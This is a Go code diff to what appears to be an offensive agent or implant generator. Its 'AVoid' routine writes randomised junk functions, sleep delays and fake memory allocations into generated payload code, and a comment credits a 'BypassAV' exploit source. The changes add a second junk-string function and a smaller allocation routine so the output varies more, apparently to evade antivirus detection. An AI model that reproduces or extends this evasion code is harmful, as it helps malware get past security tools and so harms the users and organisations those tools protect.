@@ -128,10 +128,20 @@ func (ac *AgentCode) AVoid(s string) {
 		"len(s)/2",
 		"len(s)-1",
 	)
+	stb2 = fmt.Sprintf(stbo2,
+		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
+		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
+		fmt.Sprintf("RandStringRunes(%d)", rand.Intn(100)),
+		"len(s)/2",
+		"len(s)-1",
+	)
 	ac.GlobalVars = "*/\nvar x []byte\n/*" + ac.GlobalVars
 	sleeper = fmt.Sprintf(sleepero, rand.Intn(30))
-	fakemem = fmt.Sprintf(fakememo, rand.Intn(30), rand.Intn(10000), rand.Intn(102400000-5), rand.Intn(254))
-	ac.AVoidance = `*/` + stb + sleeper + fakemem + hops + `/*`
+	bufsize := rand.Intn(10000) + 10
+	fakemem = fmt.Sprintf(fakememo, rand.Intn(30), rand.Intn(10000), bufsize, rand.Intn(bufsize-5), rand.Intn(254))
+	bufsize = rand.Intn(100) + 10
+	smallmem = fmt.Sprintf(smallmemo, rand.Intn(30), rand.Intn(10000), bufsize, rand.Intn(bufsize-5), rand.Intn(254))
+	ac.AVoidance = `*/` + stb + stb2 + sleeper + fakemem + hops + smallmem + `/*`
 	//put sleep on init
 	ac.Init = "*/" + "\nsleeper()\n" + "/*" + ac.Init
 	//start a async random order thingo
@@ -149,7 +159,7 @@ func (ac *AgentCode) AVoid(s string) {
 		if rand.Intn(2) == 1 {
 			ac.Init = "*/" + fmt.Sprintf("hop%d()\n", rand.Intn(9)) + "/*" + ac.Init
 			if rand.Intn(2) == 1 {
-				ac.Init = "*/" + fmt.Sprintf(`x=doStuff1(RandStringRunes(%d))
+				ac.Init = "*/" + fmt.Sprintf(`x=doStuff2(RandStringRunes(%d))
 			if x != nil {
 			}
 			`, rand.Intn(10)) + "/*" + ac.Init
@@ -193,6 +203,18 @@ const stbo = `
 func doStuff1(s string) []byte {
 	s = %s + %s + %s
 	s = s[%s:%s]
+	allocateSmallmemory()
+	hops[rand.Intn(len(hops))]()
+	return []byte(s)
+}
+`
+
+var stb2 = ``
+
+const stbo2 = `
+func doStuff2(s string) []byte {
+	s = %s + %s + %s
+	s = s[%s:%s]
 	allocateFakeMemory()
 	hops[rand.Intn(len(hops))]()
 	return []byte(s)
@@ -207,6 +229,21 @@ func sleeper(){
 }
 `
 
+var smallmem = ``
+
+const smallmemo = `
+func allocateSmallmemory()  { 
+	for i := 0; i < %d; i++ {
+	  var size int = %d+1
+	  hops[rand.Intn(len(hops))]()
+	  Buffer_1 := make([]byte, size)
+	  Buffer_1[size-1] = 1
+	  var Buffer_2 [%d]byte
+	  Buffer_2[%d] = %d
+	}
+  }
+`
+
 //https://github.com/EgeBalci/EGESPLOIT/blob/master/BypassAV.go
 var fakemem = ``
 
@@ -217,7 +254,7 @@ func allocateFakeMemory()  {
 	  hops[rand.Intn(len(hops))]()
 	  Buffer_1 := make([]byte, size)
 	  Buffer_1[size-1] = 1
-	  var Buffer_2 [102400000]byte
+	  var Buffer_2 [%d]byte
 	  Buffer_2[%d] = %d
 	}
   }
